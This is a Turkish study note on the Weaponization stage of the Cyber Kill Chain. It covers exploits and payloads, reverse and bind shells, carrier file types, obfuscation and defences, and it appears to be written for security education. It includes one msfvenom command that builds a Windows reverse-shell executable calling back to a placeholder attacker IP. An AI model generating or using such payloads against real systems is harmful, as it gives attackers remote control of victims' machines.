> [!summary] Özet
> **Weaponization (Silahlanma)**, keşifte bulunan zafiyete uygun "silahın" hazırlandığı aşamadır. Exploit ile payload birleştirilir ve hedefe ulaştırılabilecek bir dosyaya veya içeriğe yerleştirilir.
> **Exploit + Payload = Weapon**

## Exploit ve Payload

| Kavram | Tanım | Benzetme |
|---|---|---|
| **Exploit** | Hedef sistemdeki zafiyeti tetikleyerek sistemin beklenenin dışında çalışmasını sağlayan kod | Kapının kilidini açan maymuncuk |
| **Payload** | Exploit başarılı olduktan sonra hedefte çalışan asıl kod; amaç erişim sağlamak, veri çalmak veya sistemi kontrol etmektir | Kapıdan içeri giren hırsız |

**Yaygın payload türleri** (bkz. [[1-Shell Mimarisi]]):
- **Reverse Shell:** Hedef, saldırgana bağlantı kurar
- **Bind Shell:** Hedef bir port açar ve saldırgan o porta bağlanır

## Taşıyıcı Dosya Türleri

- Ofis dokümanları (makrolar)
- PDF dosyaları
- HTA ve script dosyaları (VBS, JS, PowerShell)

## Araçlar

- **msfvenom:** Metasploit'in payload üretme aracı

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<saldırgan_ip> LPORT=4444 -f exe -o payload.exe
```

## Obfuscation (Gizleme)

Zararlı kodun antivirüs ve analistler tarafından tanınmasını zorlaştırmak için kullanılır:

- **Encoding:** Kodu farklı bir formatta (ör. Base64) temsil etmek
- **Packing:** Çalıştırılabilir dosyayı sıkıştırıp çalışma anında açılacak şekilde paketlemek
- **Encryption:** Zararlı kodu şifreleyip yalnızca çalışma anında çözmek

Ayrıntı için bkz. [[0-Encoding vs Hashing vs Encryption]]

## Silahlanma Aşamasında Savunma

> [!important]
> Bu aşama tamamen **saldırganın tarafında** gerçekleşir; savunmacı doğrudan göremez ve müdahale edemez. Savunma, sonraki aşamalara **hazırlıktır**.

- Tehdit istihbaratı (Threat Intelligence) ile yeni çıkan exploit ve zararlı yazılımları takip edip analiz etmek
- Şüpheli dosyaları sandbox ortamında analiz etmek
- E-posta güvenliğini sağlamak (makrolu dokümanları engellemek vb.)

## İlgili Notlar

- Önceki aşama: [[1-Recon|Reconnaissance]] · Sonraki aşama: [[3-Delivery|Delivery]]
- [[0-Cyber Kill Chain|Cyber Kill Chain]]
